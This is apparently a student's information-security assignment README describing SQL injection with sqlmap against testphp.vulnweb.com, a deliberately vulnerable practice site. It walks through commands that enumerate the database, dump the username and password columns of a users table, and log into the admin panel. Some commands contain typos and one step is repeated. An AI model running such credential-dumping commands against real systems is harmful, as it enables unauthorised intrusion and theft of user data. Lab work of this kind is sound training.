# COMP421-InfoSec Assignment 1
# Muhammad Sulaiman Sultan 231453415

## Pre-Requisites
- Install ```sqlmap``` using the command ```sudo apt-get install sqlmap```

## SQL Injection
1. Go to ```vulnweb.com``` and open any sub domain. I am using Acuart sub domain ```http://vulnweb.com```.
2. Find a link which makes a query request to the SQL database at the backend. We can browse to one of the tabs like ```artist``` tab and click on one of the links. This takes us to the page with the following link: ```http://testphp.vulnweb.com/artists.php?artist=1```.
3. We can now use the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --dbs``` to find the databases hosted in the backend.
4. We can now find the tables in the database using the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables```.
5. Out of all the tables we find, we will choose the ```users``` table and and then run the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart -T users columns``` and see the columns within the ```user``` table.
6. Out of all the columns we are able to find, we will target the ```uname``` column and get its data by running the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump``` 
7. We will now target the ```uname``` column and get its data by running the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump```
8. We will also target the ```pass``` column and get its data by running the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump```
8. Since both commands yield ```test``` this means that both the username and the password are 'test' for the admin panel on this website.

We can now log into the websites admin panel with the username and password we have yielded using this SQL Injection.

## Commands executed and their outputs recieved
1. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --dbs```
![image](https://user-images.githubusercontent.com/64100540/200076869-0e784ec5-33e2-4cdb-a67d-b7cac8bbf110.png)

2. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables```
![image](https://user-images.githubusercontent.com/64100540/200076900-191ea1dd-cd40-4ce7-a3f1-fecbe2fb0507.png)

3. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns``` 
![image](https://user-images.githubusercontent.com/64100540/200077042-25387967-c01c-489c-b872-9f77a8230431.png)

4. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump```
![image](https://user-images.githubusercontent.com/64100540/200077088-cc369444-9eda-48ee-b3f9-ebf6b86b709f.png)

5.  ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump```
![image](https://user-images.githubusercontent.com/64100540/200077127-3d39edad-a0b6-4388-b474-49177bb2a692.png)

## Logging into the admin panel
![image](https://user-images.githubusercontent.com/64100540/200077622-6855b777-2db7-40d2-8c80-51a323dd8e67.png)
